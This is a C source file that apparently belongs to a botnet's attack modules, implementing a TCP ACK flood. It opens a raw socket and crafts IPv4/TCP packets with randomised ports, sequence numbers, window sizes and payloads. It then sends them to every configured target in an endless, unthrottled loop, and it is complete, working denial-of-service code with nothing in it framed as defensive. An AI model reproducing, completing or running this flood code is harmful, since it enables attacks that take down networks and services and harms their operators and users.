#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_tcpack(pflood_context_t ctx) {

  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    LOG_ERROR("allocating targets failed");
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *iph = (struct iphdr *)packets[i];

    iph->version = 4;
    iph->ihl = 5;
    iph->ttl = 64;
    iph->tos = 0;
    iph->protocol = IPPROTO_TCP;

    iph->id = xoshiro_next() & 0xFFFF;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + len);
    iph->frag_off = 0;

    iph->saddr = network_local_addr();
    iph->daddr = target->address;

    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    tcph->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
    tcph->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
    tcph->doff = 5;

    tcph->urg = 0;
    tcph->ack = 1;
    tcph->psh = 0;
    tcph->rst = 0;
    tcph->syn = 0;
    tcph->fin = 0;
    tcph->window = xoshiro_next() & 0xFFFF;

    char *payload = (char *)(tcph + 1);
    xoshiro_bytes(payload, len);
  }

  while (true) {
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];
      target_random_addr(target);

      char *pkt = packets[i];

      struct iphdr *iph = (struct iphdr *)pkt;
      struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
      char *data = (char *)(tcph + 1);

      if (random) xoshiro_bytes(data, len);

      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + len);

      // randomize window and sequence and stuff
      tcph->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      tcph->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);

      // random shit
      tcph->ack_seq = xoshiro_next() & 0xFFFF;
      tcph->seq = xoshiro_next() & 0xFFFF;
      tcph->window = xoshiro_next() & 0xFFFF;

      // calc checksum
      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      tcph->check = 0;
      tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + len),
                                    sizeof(struct tcphdr) + len);

      sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + len, MSG_NOSIGNAL,
             (struct sockaddr *)&target->saddr, sizeof(struct sockaddr_in));
    }
  }
}
